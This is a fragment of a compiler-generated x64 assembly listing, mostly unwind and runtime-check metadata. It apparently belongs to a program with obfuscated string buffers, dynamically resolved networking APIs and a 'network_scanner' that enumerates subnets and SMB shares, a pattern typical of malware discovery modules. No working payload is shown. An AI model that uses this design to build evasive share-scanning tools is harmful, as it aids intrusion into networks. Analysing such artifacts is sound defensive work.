$unwind$?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08ddH
	DW	0907H
	DW	0931H
	DW	095bH
	DW	0985H
	DW	09afH
	DW	09d9H
	DW	0a03H
	DW	0a2dH
	DW	0a57H
	DW	0a81H
	DW	0aabH
	DW	0ad5H
	DW	0affH
	DW	0b29H
	DW	0b53H
	DW	0b7dH
	DW	0ba7H
	DW	0bd1H
	DW	0bfbH
	DW	0c25H
	DW	0c4fH
	DW	0c79H
	DW	0ca3H
	DW	0ccdH
	DW	0cf7H
	DW	0d21H
	DW	0d4bH
	DW	0d55H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08ddH
	DW	0907H
	DW	0931H
	DW	095bH
	DW	0985H
	DW	09afH
	DW	09d9H
	DW	0a03H
	DW	0a2dH
	DW	0a57H
	DW	0a81H
	DW	0aabH
	DW	0ad5H
	DW	0affH
	DW	0b29H
	DW	0b53H
	DW	0b7dH
	DW	0ba7H
	DW	0bd1H
	DW	0bfbH
	DW	0c25H
	DW	0c4fH
	DW	0c79H
	DW	0ca3H
	DW	0ccdH
	DW	0cf7H
	DW	0d21H
	DW	0d4bH
	DW	0d55H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	036H
	DW	043dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD 025053d19H
	DD	010e2313H
	DD	0700700d5H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0698H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcName$0 DB 054H	; GetSubnets
	DB	061H
	DB	062H
	DB	06cH
	DB	065H
	DB	053H
	DB	069H
	DB	07aH
	DB	065H
	DB	00H
	ORG $+6
?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcName$1 DB 077H	; GetSubnets
	DB	073H
	DB	07aH
	DB	049H
	DB	070H
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	065H
	DB	073H
	DB	073H
	DB	00H
	ORG $+3
?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcName$2 DB 064H	; GetSubnets
	DB	077H
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	065H
	DB	073H
	DB	073H
	DB	00H
	ORG $+2
?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcName$3 DB 049H	; GetSubnets
	DB	06eH
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	00H
	ORG $+5
?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcName$4 DB 062H	; GetSubnets
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	065H
	DB	073H
	DB	00H
?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcVarDesc DD 0274H ; GetSubnets
	DD	04H
	DQ	FLAT:?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcName$4
	DD	0154H
	DD	04H
	DQ	FLAT:?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcName$3
	DD	0f4H
	DD	04H
	DQ	FLAT:?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcName$2
	DD	0a8H
	DD	02cH
	DQ	FLAT:?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcName$1
	DD	024H
	DD	04H
	DQ	FLAT:?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcName$0
	ORG $+240
?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcFrameData DD 05H ; GetSubnets
	DD	00H
	DQ	FLAT:?GetSubnets@@YAHPEAUsubnet_list_@@@Z$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02aH
	DW	0135H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetConnectEX@@YAHXZ DD 055053119H
	DD	010a530fH
	DD	070030035H
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	0198H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?GetConnectEX@@YAHXZ$rtcName$0 DB 064H			; GetConnectEX
	DB	077H
	DB	042H
	DB	079H
	DB	074H
	DB	065H
	DB	073H
	DB	00H
?GetConnectEX@@YAHXZ$rtcName$1 DB 067H			; GetConnectEX
	DB	075H
	DB	069H
	DB	064H
	DB	00H
	ORG $+3
?GetConnectEX@@YAHXZ$rtcVarDesc DD 0b8H			; GetConnectEX
	DD	010H
	DQ	FLAT:?GetConnectEX@@YAHXZ$rtcName$1
	DD	054H
	DD	04H
	DQ	FLAT:?GetConnectEX@@YAHXZ$rtcName$0
	ORG $+96
?GetConnectEX@@YAHXZ$rtcFrameData DD 02H		; GetConnectEX
	DD	00H
	DQ	FLAT:?GetConnectEX@@YAHXZ$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	02aH
	DB	08aH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetCurrentIpAddress@@YAKXZ DD 025053119H
	DD	010a230fH
	DD	070030045H
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	0218H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?GetCurrentIpAddress@@YAKXZ$rtcName$0 DB 073H		; GetCurrentIpAddress
	DB	07aH
	DB	048H
	DB	06fH
	DB	073H
	DB	074H
	DB	04eH
	DB	061H
	DB	06dH
	DB	065H
	DB	00H
	ORG $+1
?GetCurrentIpAddress@@YAKXZ$rtcName$1 DB 049H		; GetCurrentIpAddress
	DB	06eH
	DB	041H
	DB	064H
	DB	064H
	DB	072H
	DB	00H
	ORG $+13
?GetCurrentIpAddress@@YAKXZ$rtcVarDesc DD 0144H		; GetCurrentIpAddress
	DD	04H
	DQ	FLAT:?GetCurrentIpAddress@@YAKXZ$rtcName$1
	DD	030H
	DD	0100H
	DQ	FLAT:?GetCurrentIpAddress@@YAKXZ$rtcName$0
	ORG $+96
?GetCurrentIpAddress@@YAKXZ$rtcFrameData DD 02H		; GetCurrentIpAddress
	DD	00H
	DQ	FLAT:?GetCurrentIpAddress@@YAKXZ$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?positive_modulo@@YAHHH@Z DD 025051601H
	DD	01112316H
	DD	0700a001dH
	DD	05009H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pinet_ntoa@@YAPEADUin_addr@@@Z DD 025051201H
	DD	010d2312H
	DD	070060021H
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pStrStrIA@@YAPEBDPEBD0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWSACleanup@@YAHXZ DD 025050f01H
	DD	010a230fH
	DD	070030021H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWSAStartup@@YAHGPEAUWSAData@@@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pshutdown@@YAH_KH@Z DD 025051701H
	DD	01122317H
	DD	0700b0021H
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pgetsockopt@@YAH_KHHPEADPEAH@Z DD 035052101H
	DD	011c3321H
	DD	070150023H
	DD	05014H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?psetsockopt@@YAH_KHHPEBDH@Z DD 035052101H
	DD	011c3321H
	DD	070150023H
	DD	05014H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pbind@@YAH_KPEBUsockaddr@@H@Z DD 025051d01H
	DD	0118231dH
	DD	070110021H
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z DD 035052001H
	DD	011b3320H
	DD	070140023H
	DD	05013H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z DD 035052101H
	DD	011c3321H
	DD	070150023H
	DD	05014H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pclosesocket@@YAH_K@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z DD 055052101H
	DD	011c5321H
	DD	070150027H
	DD	05014H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pgethostname@@YAHPEADH@Z DD 025051701H
	DD	01122317H
	DD	0700b0021H
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pgethostbyname@@YAPEAUhostent@@PEBD@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z DD 025051d01H
	DD	0118231dH
	DD	070110021H
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z DD 045052101H
	DD	011c4321H
	DD	070150025H
	DD	05014H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pNetApiBufferFree@@YAKPEAX@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateTimerQueue@@YAPEAXXZ DD 025050f01H
	DD	010a230fH
	DD	070030021H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z DD 025052201H
	DD	011d2322H
	DD	070160021H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGlobalFree@@YAPEAXPEAX@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGlobalAlloc@@YAPEAXI_K@Z DD 025051701H
	DD	01122317H
	DD	0700b0021H
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pSleep@@YAXK@Z DD 025051201H
	DD	010d2312H
	DD	070060021H
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z DD 025052101H
	DD	011c2321H
	DD	070150021H
	DD	05014H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pExitThread@@YAXK@Z DD 025051201H
	DD	010d2312H
	DD	070060021H
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z DD 035052201H
	DD	011d3322H
	DD	070160023H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pDeleteTimerQueue@@YAHPEAX@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z DD 045052201H
	DD	011d4322H
	DD	070160025H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrcmpiW@@YAHPEB_W0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z DD 035052201H
	DD	011d3322H
	DD	070160023H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCloseHandle@@YAHPEAX@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrcatW@@YAPEA_WPEA_WPEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetLastError@@YAKXZ DD 025050f01H
	DD	010a230fH
	DD	070030021H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWaitForSingleObject@@YAKPEAXK@Z DD 025051701H
	DD	01122317H
	DD	0700b0021H
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCancelIo@@YAHPEAX@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	03bH
	DW	02c6H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD 045054219H
	DD	01134318H
	DD	0700c0059H
	DD	0500bH
	DD	imagerel __GSHandlerCheck
	DD	02b0H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcName$0 DB 053H ; network_scanner::EnumShares
	DB	068H
	DB	061H
	DB	072H
	DB	065H
	DB	049H
	DB	06eH
	DB	066H
	DB	06fH
	DB	042H
	DB	075H
	DB	066H
	DB	066H
	DB	065H
	DB	072H
	DB	00H
?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcName$1 DB 065H ; network_scanner::EnumShares
	DB	072H
	DB	00H
	ORG $+1
?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcName$2 DB 074H ; network_scanner::EnumShares
	DB	072H
	DB	00H
	ORG $+1
?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcName$3 DB 072H ; network_scanner::EnumShares
	DB	065H
	DB	073H
	DB	075H
	DB	06dH
	DB	065H
	DB	00H
	ORG $+1
?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcVarDesc DD 0c4H ; network_scanner::EnumShares
	DD	04H
	DQ	FLAT:?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcName$3
	DD	0a4H
	DD	04H
	DQ	FLAT:?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcName$2
	DD	084H
	DD	04H
	DQ	FLAT:?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcName$1
	DD	068H
	DD	08H
	DQ	FLAT:?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcName$0
	ORG $+192
?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcFrameData DD 04H ; network_scanner::EnumShares
	DD	00H
	DQ	FLAT:?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02aH
	DW	030cH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?StartScan@network_scanner@@YAXXZ DD 035053119H
	DD	010a330fH
	DD	0700300b1H
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	0578H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?StartScan@network_scanner@@YAXXZ$rtcName$0 DB 057H	; network_scanner::StartScan
	DB	073H
	DB	061H
	DB	044H
	DB	061H
	DB	074H
	DB	061H
	DB	00H
	ORG $+8
?StartScan@network_scanner@@YAXXZ$rtcVarDesc DD 040H	; network_scanner::StartScan
	DD	0198H
	DQ	FLAT:?StartScan@network_scanner@@YAXXZ$rtcName$0
	ORG $+48
?StartScan@network_scanner@@YAXXZ$rtcFrameData DD 01H	; network_scanner::StartScan
	DD	00H
	DQ	FLAT:?StartScan@network_scanner@@YAXXZ$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ DD 025051301H
